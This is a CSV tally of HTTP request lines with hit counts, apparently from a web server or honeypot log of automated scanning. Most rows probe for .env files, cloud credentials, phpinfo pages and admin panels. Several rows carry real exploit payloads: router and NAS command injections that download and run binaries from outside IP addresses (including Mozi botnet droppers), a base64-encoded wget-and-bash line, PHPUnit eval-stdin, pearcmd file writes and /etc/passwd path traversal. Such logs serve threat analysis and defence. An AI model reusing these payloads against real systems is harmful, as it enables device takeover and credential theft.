url,count
POST /xmlrpc.php HTTP/1.1,7639
GET / HTTP/1.1,1069
GET /manager/html HTTP/1.1,956
POST /dr/tomcat.jsp HTTP/1.1,210
POST /tomcat.jsp HTTP/1.1,210
POST /autodiscover HTTP/1.1,146
CONNECT google.com:443 HTTP/1.1,126
GET /.env HTTP/1.1,125
GET /favicon.ico HTTP/1.1,108
GET / HTTP/1.0,96
GET /tomcat.jsp HTTP/1.1,87
POST / HTTP/1.1,73
GET /dr/tomcat.jsp HTTP/1.1,70
GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F103.163.214.97%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk) HTTP/1.1,63
CONNECT www.google.com:443 HTTP/1.1,39
GET /.git/config HTTP/1.1,36
GET /info.php HTTP/1.1,29
GET /bundle.js HTTP/1.1,26
GET /1.php HTTP/1.1,26
GET /upl.php HTTP/1.1,25
GET /files/ HTTP/1.1,25
GET /form.html HTTP/1.1,25
GET /geoip/ HTTP/1.1,25
GET /systembc/password.php HTTP/1.1,25
GET /password.php HTTP/1.1,25
GET /geoserver/web/ HTTP/1.1,22
GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F5.181.190.250%2Fsh+%3B+chmod+777+sh%3B+.%2Fsh+tplink%3B+rm+-rf+shk) HTTP/1.1,21
GET /actuator/gateway/routes HTTP/1.1,21
GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1,20
GET /robots.txt HTTP/1.1,19
GET /debug/default/view?panel=config HTTP/1.1,14
GET /sitemap.xml HTTP/1.1,13
POST /boaform/admin/formLogin HTTP/1.1,12
GET /_profiler/phpinfo HTTP/1.1,11
GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id>`cd+/tmp;+rm+-rf+shk;+wget+http://103.163.214.97/shk;+chmod+777+shk;+./shk+tplink;+rm+-rf+shk`) HTTP/1.1,11
POST /GponForm/diag_Form?images/ HTTP/1.1,10
HEAD / HTTP/1.1,9
GET /hudson HTTP/1.1,9
GET /actuator/health HTTP/1.1,9
GET /druid/index.html HTTP/1.1,9
GET /.vscode/sftp.json HTTP/1.1,9
GET /config.json HTTP/1.1,8
GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+r%3B+wget+http%3A%2F%2F94.156.79.193%2Fr%3B+chmod+777+r%3B+.%2Fr+tplink%3B+rm+-rf+r%60) HTTP/1.1,8
GET /portal/redlion HTTP/1.1,8
GET /.DS_Store HTTP/1.1,8
GET /cgi-bin/orospucoc.cgi?user=messagebus&passwd=&cmd=15&system=dW5hbWUJLW0= HTTP/1.1,8
GET http://httpbin.org/ip HTTP/1.1,7
GET /server-status HTTP/1.1,6
GET /sendgrid/.env HTTP/1.1,6
GET /cgi/conf.bin HTTP/1.1,6
GET /mailman/listinfo/mailman HTTP/1.1,6
GET /v2/_catalog HTTP/1.1,6
GET /api/.env HTTP/1.1,6
POST /core/.env HTTP/1.1,5
GET /axis2-admin/ HTTP/1.1,5
GET /aab8 HTTP/1.1,5
GET /axis2/ HTTP/1.1,5
GET /telescope/requests HTTP/1.1,5
GET /core/.env HTTP/1.1,5
GET /aaa9 HTTP/1.1,5
GET /axis2/axis2-admin/ HTTP/1.1,5
GET /boaform/admin/formLogin?username=user&psd=user HTTP/1.0,4
GET /boaform/admin/formLogin?username=admin&psd=admin HTTP/1.0,4
GET /cgi-bin/authLogin.cgi HTTP/1.1,4
GET /Kvsh/geti.php HTTP/1.1,4
GET /manager/text/list HTTP/1.1,4
GET /ReportServer HTTP/1.1,4
GET /laravel/.env HTTP/1.1,4
GET /phpmyadmin/index.php HTTP/1.1,4
GET /cf_scripts/scripts/ajax/ckeditor/ckeditor.js HTTP/1.1,4
GET /about HTTP/1.1,3
GET /2019/wp-includes/wlwmanifest.xml HTTP/1.1,3
GET /Pages/log/ HTTP/1.1,3
GET /wp-content/plugins/kingcomposer/readme.txt HTTP/1.1,3
GET /cdn-cgi/trace HTTP/1.1,3
GET /_all_dbs HTTP/1.1,3
GET /login.action HTTP/1.1,3
GET /ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application HTTP/1.1,3
GET /cms/wp-includes/wlwmanifest.xml HTTP/1.1,3
GET /Kvsh/c.php?server=1&type=1 HTTP/1.1,3
GET /server HTTP/1.1,3
GET /solr/admin/cores?action=STATUS&wt=json HTTP/1.1,3
GET /s/0343e2837313e2234323e2333313/_/;/META-INF/maven/com.atlassian.jira/jira-webapp-dist/pom.properties HTTP/1.1,3
POST /sdk HTTP/1.1,3
GET /query?q=SHOW+DIAGNOSTICS HTTP/1.1,3
POST /Kvsh/login/index_main.php HTTP/1.1,3
GET /solr/admin/info/system HTTP/1.1,3
GET /?%3Cplay%3Ewithme%3C/%3E HTTP/1.1,3
GET /xmlrpc.php?rsd HTTP/1.1,3
GET /site/wp-includes/wlwmanifest.xml HTTP/1.1,3
GET /web/wp-includes/wlwmanifest.xml HTTP/1.1,3
GET /Temporary_Listen_Addresses HTTP/1.1,3
GET /__tests__/test-become/.env HTTP/1.1,3
GET /?author=1 HTTP/1.1,3
POST /login HTTP/1.1,3
POST /wp-login.php HTTP/1.1,3
GET /wp1/wp-includes/wlwmanifest.xml HTTP/1.1,3
GET /blog/wp-includes/wlwmanifest.xml HTTP/1.1,3
GET /shop/wp-includes/wlwmanifest.xml HTTP/1.1,3
GET /wordpress/wp-includes/wlwmanifest.xml HTTP/1.1,3
GET /redmine/.env HTTP/1.1,3
GET /phpmyadmin4.8.5/index.php HTTP/1.1,3
GET /docker/.env HTTP/1.1,3
GET /test/wp-includes/wlwmanifest.xml HTTP/1.1,3
GET /.well-known/security.txt HTTP/1.1,3
GET /wp/wp-includes/wlwmanifest.xml HTTP/1.1,3
GET /?rest_route=/wp/v2/users/ HTTP/1.1,3
GET /frontend_dev.php/$ HTTP/1.1,2
GET /web/debug/default/view HTTP/1.1,2
GET /debug/default/view HTTP/1.1,2
GET /debug/default/view?panel=config/frontend_dev.php HTTP/1.1,2
HEAD /.env HTTP/1.1,2
GET /stalker_portal/server/tools/auth_simple.php HTTP/1.1,2
GET /boaform/admin/formLogin?username=ec8&psd=ec8 HTTP/1.0,2
GET /smtp.json HTTP/1.1,2
GET /sources/.env HTTP/1.1,2
GET /wp-admin/install.php?step=1&language=en_GB HTTP/1.1,2
GET /blog/.env HTTP/1.1,2
GET /sftp-config.json HTTP/1.1,2
GET /wp-content/ HTTP/1.1,2
GET /ext-js/app/common/zld_product_spec.js HTTP/1.1,2
GET /.env.dev HTTP/1.1,2
GET /app/.env HTTP/1.1,2
GET /apps/.env HTTP/1.1,2
GET /blogs/.env HTTP/1.1,2
GET /local/.env HTTP/1.1,2
GET /shared/.env HTTP/1.1,2
GET /.env.php HTTP/1.1,2
GET /rest/.env HTTP/1.1,2
GET /cp/.env HTTP/1.1,2
GET /fedex/.env HTTP/1.1,2
GET /sapi/debug/default/view HTTP/1.1,2
GET /sites/.env HTTP/1.1,2
GET /awsconfig.json HTTP/1.1,2
GET /sendgrid.json HTTP/1.1,2
GET /aws.json HTTP/1.1,2
GET /env.json HTTP/1.1,2
GET /zabbix/favicon.ico HTTP/1.1,2
GET /.json HTTP/1.1,2
GET /wp-admin/setup-config.php?step=1&language=en_GB HTTP/1.1,2
GET /favicon-32x32.png HTTP/1.1,2
POST /docker/.env HTTP/1.1,2
GET /.env.save HTTP/1.1,2
GET /frontend/web/debug/default/view HTTP/1.1,2
GET /system/.env HTTP/1.1,2
GET /private/.env HTTP/1.1,2
GET /script/.env HTTP/1.1,2
GET /.env.production HTTP/1.1,2
GET /.env.prod HTTP/1.1,2
GET /.env.old HTTP/1.1,2
GET /.env.dist HTTP/1.1,2
GET /back/.env HTTP/1.1,2
GET /site/.env HTTP/1.1,2
GET /debug/default/view.html HTTP/1.1,2
GET /web/.env HTTP/1.1,2
GET /2021/wp-includes/wlwmanifest.xml HTTP/1.1,2
GET /_phpinfo.php HTTP/1.1,2
GET /auth/login.html HTTP/1.1,2
GET /_info.php HTTP/1.1,2
GET /config/config.json HTTP/1.1,2
GET /_info-backoffice.php HTTP/1.1,2
GET /wp-includes/ID3/license.txt HTTP/1.1,2
GET /feed/ HTTP/1.1,2
GET /__info.php HTTP/1.1,2
GET /html/phpinfo.php HTTP/1.1,2
GET /symfony/public/_profiler/phpinfo HTTP/1.1,2
GET /config/default.json HTTP/1.1,2
GET /_phpinf.php HTTP/1.1,2
GET /phpinfo HTTP/1.1,2
GET /2020/wp-includes/wlwmanifest.xml HTTP/1.1,2
GET /parameters.yml HTTP/1.1,2
GET /.aws/credentials HTTP/1.1,2
GET /app_dev.php/_profiler/phpinfo HTTP/1.1,2
GET /app/config/parameters.yml HTTP/1.1,2
GET /tool/view/phpinfo.view.php HTTP/1.1,2
GET /public/.env HTTP/1.1,2
GET /phpinfo.php HTTP/1.1,2
GET /backend/.env HTTP/1.1,2
GET /_poopinfo.php HTTP/1.1,2
HEAD http://112.124.42.80:63435/ HTTP/1.1,2
GET /Public/home/js/check.js HTTP/1.1,2
GET /download/.env HTTP/1.1,2
GET /database/.env HTTP/1.1,2
GET /pmd/index.php HTTP/1.1,2
GET /client/.env HTTP/1.1,2
GET /docs/.env HTTP/1.1,2
GET /main/.env HTTP/1.1,2
GET /cgi-sys/defaultwebpage.cgi HTTP/1.1,2
GET /.well-known/probing.txt HTTP/1.1,2
GET /static/admin/javascript/hetong.js HTTP/1.1,2
GET /shell?cd+/tmp;rm+-rf+*;wget+http://192.168.1.1:8088/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.1,2
GET login.cgi HTTP/1.1,2
GET /gists/cache HTTP/1.1,2
GET /admin/.env HTTP/1.1,2
GET /lib/.env HTTP/1.1,2
GET /evox/about HTTP/1.1,2
GET /uploads/.env HTTP/1.1,2
GET /_wpeprivate/config.json HTTP/1.1,2
POST /cgi-bin/luci/;stok=/locale?form=country HTTP/1.1,2
GET /HNAP1 HTTP/1.1,2
HEAD /icons/.%%32%65/.%%32%65/apache2/icons/non-existant-image.png HTTP/1.1,1
GET /identity HTTP/1.1,1
GET /showLogin.cc HTTP/1.1,1
GET /Telerik.Web.UI.WebResource.axd?type=rau HTTP/1.1,1
GET /sugar_version.json HTTP/1.1,1
GET /solr/ HTTP/1.1,1
GET /static/historypage.js HTTP/1.1,1
GET /api/session/properties HTTP/1.1,1
GET /index.jsp HTTP/1.1,1
GET /sitecore/shell/sitecore.version.xml HTTP/1.1,1
GET /js/NewWindow_2_all.js HTTP/1.1,1
GET /admin/ HTTP/1.1,1
GET /webfig/ HTTP/1.1,1
HEAD /icons/sphere1.png HTTP/1.1,1
POST /phpunit/Util/PHP/eval-stdin.php%20/lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1,1
HEAD /icons/.%%32%65/.%%32%65/apache2/icons/sphere1.png HTTP/1.1,1
POST /vendor/phpunit/Util/PHP/eval-stdin.php%20/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1,1
GET /config.dat HTTP/1.0,1
POST /.env.prod HTTP/1.1,1
GET /c/ HTTP/1.1,1
GET /db_backup/ HTTP/1.1,1
POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1,1
POST /vendor/phpunit/phpunit/Util/PHP/eval-stdin.php%20/vendor/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1,1
POST /.env.production HTTP/1.1,1
HEAD /icons/.%2e/%2e%2e/apache2/icons/sphere1.png HTTP/1.1,1
POST /lib/phpunit/phpunit/Util/PHP/eval-stdin.php%20/lib/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1,1
POST /lib/phpunit/Util/PHP/eval-stdin.php HTTP/1.1,1
POST /admin/ckeditor/plugins/ajaxplorer/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1,1
POST /.env HTTP/1.1,1
POST /.env.save HTTP/1.1,1
POST /.env.old HTTP/1.1,1
GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F185.224.128.34%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk) HTTP/1.1,1
POST /system/.env HTTP/1.1,1
GET /.env.development%20 HTTP/1.1,1
GET /development/.env%20 HTTP/1.1,1
POST /redmine/.env HTTP/1.1,1
GET /enviroments/.env.production HTTP/1.1,1
POST /private/.env HTTP/1.1,1
POST /apps/.env%20 HTTP/1.1,1
GET /apps/.env%20 HTTP/1.1,1
POST /development/.env%20 HTTP/1.1,1
POST /app/.env%20 HTTP/1.1,1
POST /cms/.env HTTP/1.1,1
GET /app/.env%20 HTTP/1.1,1
POST /api/.env HTTP/1.1,1
POST /admin-app/.env%20 HTTP/1.1,1
GET /admin-app/.env%20 HTTP/1.1,1
POST /laravel/.env%20 HTTP/1.1,1
GET /laravel/.env%20 HTTP/1.1,1
GET /cms/.env HTTP/1.1,1
POST /script/.env HTTP/1.1,1
POST /sources/.env HTTP/1.1,1
POST /.env.project%20 HTTP/1.1,1
POST /.env.dist HTTP/1.1,1
GET /live_env%20 HTTP/1.1,1
POST /live_env%20 HTTP/1.1,1
GET /application/.env HTTP/1.1,1
POST /application/.env HTTP/1.1,1
GET /.env.project%20 HTTP/1.1,1
POST /back/.env HTTP/1.1,1
POST /shared/.env%20 HTTP/1.1,1
POST /.env.development%20 HTTP/1.1,1
POST /fedex/.env HTTP/1.1,1
POST /__tests__/test-become/.env HTTP/1.1,1
POST /local/.env HTTP/1.1,1
POST /rest/.env HTTP/1.1,1
GET /shared/.env%20 HTTP/1.1,1
POST /phpunit/phpunit/Util/PHP/eval-stdin.php%20/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1,1
HEAD / HTTP/1.0,1
POST /enviroments/.env.production HTTP/1.1,1
GET /deployment-config.json HTTP/1.1,1
GET /db/robomongo.json HTTP/1.1,1
POST /enviroments/.env HTTP/1.1,1
GET /AwsConfig.json HTTP/1.1,1
GET /conf.json HTTP/1.1,1
GET /db.json HTTP/1.1,1
GET /ws-config.json HTTP/1.1,1
GET /robomongo.json HTTP/1.1,1
GET /config/parameters.yml HTTP/1.1,1
GET /_profiler/open?file=app/config/parameters.yml HTTP/1.1,1
GET /client_secrets.json HTTP/1.1,1
GET /user-config.json HTTP/1.1,1
GET /ssh-config.json HTTP/1.1,1
GET /database-config.json HTTP/1.1,1
GET /credentials/config.json HTTP/1.1,1
GET /nmaplowercheck1713372128 HTTP/1.1,1
GET /?phpinfo=1 HTTP/1.1,1
GET /enviroments/.env HTTP/1.1,1
GET /02-info.php HTTP/1.1,1
GET /NmapUpperCheck1713372128 HTTP/1.1,1
GET /?phpinfo=-1 HTTP/1.1,1
GET /.__info.php HTTP/1.1,1
GET /.info.php HTTP/1.1,1
GET /0.0_phpinfo.php HTTP/1.1,1
GET /00_server_info.php HTTP/1.1,1
GET /5info.php HTTP/1.1,1
GET /pub/time.series/overview.txt HTTP/1.1,1
GET /owncloud/apps/graphapi/vendor/microsoft/microsoft-graph/tests/GetPhpInfo.php HTTP/1.1,1
GET /api/index.php/v1/config/application?public=true HTTP/1.1,1
GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://182.113.45.94:50744/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0,1
GET /gui/status_main.cgi HTTP/1.1,1
GET /feed/jolts.rss HTTP/1.1,1
GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://59.178.18.1:35033/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0,1
GET /app_dev.php/_profiler/open?file=app/config/parameters.yml HTTP/1.1,1
GET /wp-includes/wlwmanifest.xml HTTP/1.1,1
GET /website/wp-includes/wlwmanifest.xml HTTP/1.1,1
GET /wp-includes/admin.php?520 HTTP/1.1,1
GET /cmd.cgi HTTP/1.1,1
GET /downloader.php?file=;echo%20d2dldCBodHRwOi8vMTQxLjk4LjEwLjc2L2Jvb3RlcnMvYm9vdGVyLmFybTc7IGNobW9kIDc3NyBib290ZXIuYXJtNzsgLi9ib290ZXIuYXJtNyBib290ZXIuYXJtNw==%3D%3D%7Cbase64%20-d%7Cbash%00.zip HTTP/1.1,1
GET //.env HTTP/1.1,1
GET /wp-includes/about.php?520 HTTP/1.1,1
GET /wp-admin/about.php?520 HTTP/1.1,1
GET /wp-content/about.php?520 HTTP/1.1,1
GET /wp-admin/admin.php?520 HTTP/1.1,1
GET /news/wp-includes/wlwmanifest.xml HTTP/1.1,1
GET /wp-content/admin.php?520 HTTP/1.1,1
GET /about.php?520 HTTP/1.1,1
GET /admin.php?520 HTTP/1.1,1
GET /sito/wp-includes/wlwmanifest.xml HTTP/1.1,1
GET /wp2/wp-includes/wlwmanifest.xml HTTP/1.1,1
GET /media/wp-includes/wlwmanifest.xml HTTP/1.1,1
GET /cgi-bin/nas_sharing.cgi?user=messagebus&passwd=&cmd=15&system=ZWNobwlzQ1ROekdEeVZxT0NVZVVicQ== HTTP/1.0,1
GET /v1/agent/self HTTP/1.1,1
GET /System/configurationFile?auth=YWRtaW46MTEK HTTP/1.1,1
GET /CFIDE/administrator/ HTTP/1.1,1
GET /boaform/admin/formLogin?username=adminisp&psd=adminisp HTTP/1.0,1
GET /HNAP1/ HTTP/1.1,1
HEAD /config.json HTTP/1.1,1
GET /index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?echo(md5(%22hi%22));?>+/tmp/index1.php HTTP/1.1,1
GET /2018/wp-includes/wlwmanifest.xml HTTP/1.1,1
GET /../../../../../etc/passwd%00 HTTP/1.1,1
GET /../../../../../mnt/mtd/Config/Account1 HTTP/1.1,1
GET /../../../../../etc/passwd%00 HTTP/1.0,1
GET /../../../../../etc/passwd HTTP/1.0,1
GET /../../../../../mnt/mtd/Config/Account1 HTTP/1.0,1
GET /current_config/Account1 HTTP/1.1,1
GET /current_config/passwd HTTP/1.1,1
GET /../../../../../etc/passwd HTTP/1.1,1
GET /cgi-bin/nas_sharing.cgi?user=messagebus&passwd=&cmd=15&system=cm0JLXJmCWFybTU= HTTP/1.1,1
GET /cgi-bin/nas_sharing.cgi?user=messagebus&passwd=&cmd=15&system=cm0JLXJmCWxvbAl8CXdnZXQJLU8tCWh0dHA6Ly85NC4xNTYuNzkuMTI5L2xvbHxzaA== HTTP/1.1,1
GET /test123.php HTTP/1.1,1
GET /_profiler/empty/search/results HTTP/1.1,1
CONNECT dope.root.africa:443 HTTP/1.1,1
POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1,1
GET /nice%20ports%2C/Tri%6Eity.txt%2ebak HTTP/1.0,1
OPTIONS / HTTP/1.0,1
POST /cgi-bin/jumpto.php?class=diagnosis&page=config_save&isphp=1 HTTP/1.1,1
GET /3/3/3/3/3/3/3/3/3/3/3/3/3/3/3/3/ HTTP/1.1,1
GET /cgi-bin/login.cgi HTTP/1.1,1
CONNECT ifconfig.me:443 HTTP/1.1,1
GET /wp-config.php. HTTP/1.1,1
GET /SSMDIyLzM1My8wNjkvNTFedzA/start.jsp HTTP/1.1,1
GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(curl+http%3A%2F%2F193.222.96.163%2Ft.sh+%7C+sh+%7C%7C+wget+-O-+http%3A%2F%2F193.222.96.163%2Ft.sh+%7C+sh) HTTP/1.1,1
GET /Nmap/folder/check1713372847 HTTP/1.1,1
GET /NmapUpperCheck1713372847 HTTP/1.1,1
GET /nmaplowercheck1713372847 HTTP/1.1,1
GET /cpanel HTTP/1.1,1
GET /agent/timeclock.php HTTP/1.1,1
GET /wp-admin/.env HTTP/1.1,1
GET /Nmap/folder/check1714100505 HTTP/1.1,1
GET /wordpress HTTP/1.1,1
POST /cgi-bin/param.cgi?post_network_other_conf HTTP/1.1,1
CONNECT files.vc:443 HTTP/1.1,1
GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F91.92.243.102%2Fsh+%3B+chmod+777+sh%3B+.%2Fsh+tplink%3B+rm+-rf+sh) HTTP/1.1,1
GET /nmaplowercheck1714100505 HTTP/1.1,1
GET /NmapUpperCheck1714100505 HTTP/1.1,1
GET /wordpress/wp-admin/setup-config.php?step=1&language=en_GB HTTP/1.1,1
GET /new/wp-admin/setup-config.php?step=1&language=en_GB HTTP/1.1,1
GET /old HTTP/1.1,1
GET /wordpress/wp-admin/install.php?step=1&language=en_GB HTTP/1.1,1
GET /wp HTTP/1.1,1
GET /wp/wp-admin/setup-config.php?step=1&language=en_GB HTTP/1.1,1
GET /wp/wp-admin/install.php?step=1&language=en_GB HTTP/1.1,1
GET /new HTTP/1.1,1
GET /new/wp-admin/install.php?step=1&language=en_GB HTTP/1.1,1
GET /old/wp-admin/setup-config.php?step=1&language=en_GB HTTP/1.1,1
GET /.env.example HTTP/1.1,1
GET /shop/wp-admin/setup-config.php?step=1&language=en_GB HTTP/1.1,1
GET /lab/.env HTTP/1.1,1
GET /vendor/.env HTTP/1.1,1
GET /.production HTTP/1.1,1
GET /.local HTTP/1.1,1
GET /.remote HTTP/1.1,1
GET /shop/wp-admin/install.php?step=1&language=en_GB HTTP/1.1,1
GET /shop HTTP/1.1,1
GET /exapi/.env HTTP/1.1,1
GET /test/wp-admin/install.php?step=1&language=en_GB HTTP/1.1,1
GET /test/wp-admin/setup-config.php?step=1&language=en_GB HTTP/1.1,1
GET /test HTTP/1.1,1
GET /blog/wp-admin/install.php?step=1&language=en_GB HTTP/1.1,1
GET /blog/wp-admin/setup-config.php?step=1&language=en_GB HTTP/1.1,1
GET /blog HTTP/1.1,1
GET /cronlab/.env HTTP/1.1,1
GET /cron/.env HTTP/1.1,1
GET /core/app/.env HTTP/1.1,1
GET /storage/.env HTTP/1.1,1
GET /sendgrid.env HTTP/1.1,1
GET /administrator/.env HTTP/1.1,1
GET /v2/.env HTTP/1.1,1
GET /v1/.env HTTP/1.1,1
GET /tools/.env HTTP/1.1,1
GET /old/wp-admin/install.php?step=1&language=en_GB HTTP/1.1,1
GET /en/.env HTTP/1.1,1
GET /psnlink/.env HTTP/1.1,1
GET /saas/.env HTTP/1.1,1
GET /sitemaps/.env HTTP/1.1,1
GET /assets/.env HTTP/1.1,1
GET /config/.env HTTP/1.1,1
GET /core/Datavase/.env HTTP/1.1,1
GET /web/.env] HTTP/1.1,1
GET /.env.bak HTTP/1.1,1
GET /.env.live HTTP/1.1,1
GET /_static/.env HTTP/1.1,1
GET /.docker/.env HTTP/1.1,1
GET /.env.swp HTTP/1.1,1
GET /.env.uat HTTP/1.1,1
GET /.env.www HTTP/1.1,1
GET /.env_1 HTTP/1.1,1
GET /.env_sample HTTP/1.1,1
GET /.env.backup HTTP/1.1,1
GET /src/.env HTTP/1.1,1
GET /files/.env HTTP/1.1,1
GET /product/.env.staging HTTP/1.1,1
GET /content/.env HTTP/1.1,1
GET /storage/.env.local HTTP/1.1,1
GET /.env.local HTTP/1.1,1
GET /media/.env HTTP/1.1,1
GET /Nmap/folder/check1713372128 HTTP/1.1,1
GET /env/.env HTTP/1.1,1
GET /index.js HTTP/1.1,1
GET /cgi-bin/.env HTTP/1.1,1
GET /audio/.env HTTP/1.1,1
GET /app/config/.env HTTP/1.1,1
GET /crm/.env HTTP/1.1,1
GET /old/.env HTTP/1.1,1
GET /new/.env HTTP/1.1,1
GET /icons/.env HTTP/1.1,1
GET /library/.env HTTP/1.1,1
GET /wp-content/.env HTTP/1.1,1
GET /conf/.env HTTP/1.1,1
GET /.environment HTTP/1.1,1
GET /index1.php HTTP/1.1,1
GET /index.php HTTP/1.1,1
GET /index.json HTTP/1.1,1
GET /user/.env.staging HTTP/1.1,1
GET /base/.env HTTP/1.1,1
GET /newsite/.env HTTP/1.1,1
GET /config.js HTTP/1.1,1
GET /.env.sample.php HTTP/1.1,1
GET /.env.production.local HTTP/1.1,1
GET /.env.docker.dev HTTP/1.1,1
GET /.env.development.local HTTP/1.1,1
GET /.envs HTTP/1.1,1
GET /.envrc HTTP/1.1,1
GET /config/aws.yml HTTP/1.1,1
GET /vendor/laravel/.env HTTP/1.1,1
GET /aws.yml HTTP/1.1,1
GET /%c0 HTTP/1.1,1
GET /wp-config.php-backup HTTP/1.1,1
GET /aws.env HTTP/1.1,1
GET /sites/all/libraries/mailchimp/.env HTTP/1.1,1
GET /www/.env HTTP/1.1,1
GET /.env.stage HTTP/1.1,1
GET /.env.staging HTTP/1.1,1
GET /test1.php HTTP/1.1,1
GET /test1 HTTP/1.1,1
GET /test0.php HTTP/1.1,1
GET /test.php HTTP/1.1,1
GET /.phpinfo HTTP/1.1,1
GET /php.php HTTP/1.1,1
GET /protected/.env HTTP/1.1,1
GET /pinfo.php HTTP/1.1,1
GET /.env~ HTTP/1.1,1
GET /.env.{{SD}} HTTP/1.1,1
GET /.env.{{DN}} HTTP/1.1,1
GET /.env.test.localapi/.env HTTP/1.1,1
GET /.env.test.local HTTP/1.1,1
GET /.env.test HTTP/1.1,1
GET /pi.php HTTP/1.1,1
GET /1_1_PhpInfo.php HTTP/1.1,1
GET /wp-config.orig HTTP/1.1,1
GET /test2.php HTTP/1.1,1
GET /test_info2.php HTTP/1.1,1
GET /test_phpinfo2.php HTTP/1.1,1
GET /test_phpinfo1.php HTTP/1.1,1
GET /test_phpinfo.php HTTP/1.1,1
GET /test_info5.php HTTP/1.1,1
GET /test_info4.php HTTP/1.1,1
GET /test_info3.php HTTP/1.1,1
GET /test_info1.php HTTP/1.1,1
GET /test_phpinfo4.php HTTP/1.1,1
GET /test_info.php HTTP/1.1,1
GET /test9.php HTTP/1.1,1
GET /test8.php HTTP/1.1,1
GET /test7.php HTTP/1.1,1
GET /test6.php HTTP/1.1,1
GET /test5.php HTTP/1.1,1
GET /test_phpinfo3.php HTTP/1.1,1
GET /test_phpinfo5.php HTTP/1.1,1
GET /dashboardadmin/phpinfo HTTP/1.1,1
GET /viewinfo.php HTTP/1.1,1
GET /inf.php HTTP/1.1,1
GET /testphp.php HTTP/1.1,1
GET /testphpinfo HTTP/1.1,1
GET /testphpinfo.php HTTP/1.1,1
GET /tester.php HTTP/1.1,1
GET /testing.php HTTP/1.1,1
GET /info.json HTTP/1.1,1
GET /info3.php HTTP/1.1,1
GET /infophp.php HTTP/1.1,1
GET /info/info.php HTTP/1.1,1
GET /info/phpinfo HTTP/1.1,1
GET /info/phpinfo.php HTTP/1.1,1
GET /info1.php HTTP/1.1,1
GET /info2.php HTTP/1.1,1
GET /info4.php HTTP/1.1,1
GET /infophp/index.php HTTP/1.1,1
GET /asdf.php HTTP/1.1,1
GET /phpinfo4.php HTTP/1.1,1
GET /phpsysinfo.php HTTP/1.1,1
GET /phpsysinfo HTTP/1.1,1
GET /phpversion.php HTTP/1.1,1
GET /phptest.php HTTP/1.1,1
GET /phpinfodev.php HTTP/1.1,1
GET /phpinfos.php HTTP/1.1,1
GET /phpinfo3.php HTTP/1.1,1
GET /p.php HTTP/1.1,1
GET /phpinfo2.php HTTP/1.1,1
GET /phpinfo1.php HTTP/1.1,1
GET /ini.php HTTP/1.1,1
GET /infos.php HTTP/1.1,1
GET /information.php HTTP/1.1,1
GET /information HTTP/1.1,1
GET /pi.php5 HTTP/1.1,1
GET /pi.php6 HTTP/1.1,1
GET /pi.php7 HTTP/1.1,1
GET /of.php HTTP/1.1,1
GET /ocp.php HTTP/1.1,1
GET /q.php HTTP/1.1,1
GET /o.php HTTP/1.1,1
GET /l.php HTTP/1.1,1
GET /a.php HTTP/1.1,1
GET /infophp/testphp.php HTTP/1.1,1
GET /i.php HTTP/1.1,1
GET /new.php HTTP/1.1,1
GET /123.php HTTP/1.1,1
GET /php-info HTTP/1.1,1
GET /temp.php HTTP/1.1,1
GET /old_phpinfo.php HTTP/1.1,1
GET /pi.php8 HTTP/1.1,1
GET /qq.php HTTP/1.1,1
GET /w.php HTTP/1.1,1
GET /web.php HTTP/1.1,1
GET /up.php HTTP/1.1,1
GET /in.php HTTP/1.1,1
GET /x.php HTTP/1.1,1
GET /foo.php HTTP/1.1,1
GET /PHPConf.php HTTP/1.1,1
GET /tz.php HTTP/1.1,1
GET /u.php HTTP/1.1,1
GET /jo.php HTTP/1.1,1
GET /phpinfo/info.php HTTP/1.1,1
GET /admin/infophp.php HTTP/1.1,1
GET /_profiler/phpinfo/info.php HTTP/1.1,1
GET /_profiler/phpinfo/phpinfo.php HTTP/1.1,1
GET /admin/dashboard/info.php HTTP/1.1,1
GET /admin/dashboard/phpinfo HTTP/1.1,1
GET /admin/dashboard/phpinfo.php HTTP/1.1,1
GET /dashboardadmin/info.php HTTP/1.1,1
GET /admin/phpinfo HTTP/1.1,1
GET /administrator/info.php HTTP/1.1,1
GET /phpinfo.txt HTTP/1.1,1
GET /phpinfo.php5 HTTP/1.1,1
GET /phpinfo.php4 HTTP/1.1,1
GET /phpinfo.php3 HTTP/1.1,1
GET /phpinfo.html HTTP/1.1,1
GET /phpdetails HTTP/1.1,1
GET /admin/phpinfo.php HTTP/1.1,1
GET /php_details HTTP/1.1,1
GET /build.php HTTP/1.1,1
GET /admin.php HTTP/1.1,1
GET /adminphp.php HTTP/1.1,1
GET /local-phpinfo.php HTTP/1.1,1
